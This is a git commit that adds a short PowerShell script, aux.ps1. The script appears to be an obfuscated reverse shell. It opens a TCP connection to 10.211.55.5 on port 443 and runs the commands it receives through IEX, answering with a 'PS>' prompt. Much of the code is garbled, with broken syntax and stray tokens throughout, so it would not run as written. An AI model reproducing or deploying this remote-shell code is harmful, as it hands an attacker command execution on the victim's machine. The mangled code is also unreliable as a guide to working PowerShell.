ed4131500f9abd0b53969001f8e93abb40bc55fd
bisoestate-bit <bisoestate@gmail.com>
2026-08-10 10:12:10 -0700

    Update and rename aur.ps1 to aux.ps1

---
+++ aux.ps1
@@ -0,0 +1,23 @@
+
+$c0p = New-Object System.Net.Sockets.TcpClient
+$P$`zr|BhC| = '10.211.55.5'.Split('.') | ForEach-Object { [Convert]::ToInt32($_, 10) }
+
+
+$Port = [System.BitConverter]::ToInt16([byte[]]@(0xBB,0x01), 0)
+
+
+Nstg*=$stream =$($Tcp Clint.)ip:$Port= New-Object System.Net.Sockets.NetworkStream($c0p.Client)
+_x.$nYc = $cl.GetSte 
+$Writer=New-Object System.IO.BinaryWriter($stream)
+New-ob (`outstring $reader).S$trea 
+
+
+$nRd`.byte[409600]$Tid 
+
+
+While ($f = $(Get-Date).Second % 2 -eq 0) { 
+    $Cmd | sc(try { 
+        IEX ` $buf
+        WRitE ($Resp + pS>' # Obfuscated response packaging
+        ($FLUsh ) }.catch{ 13|23ak } .$cp.Close()) 
+}
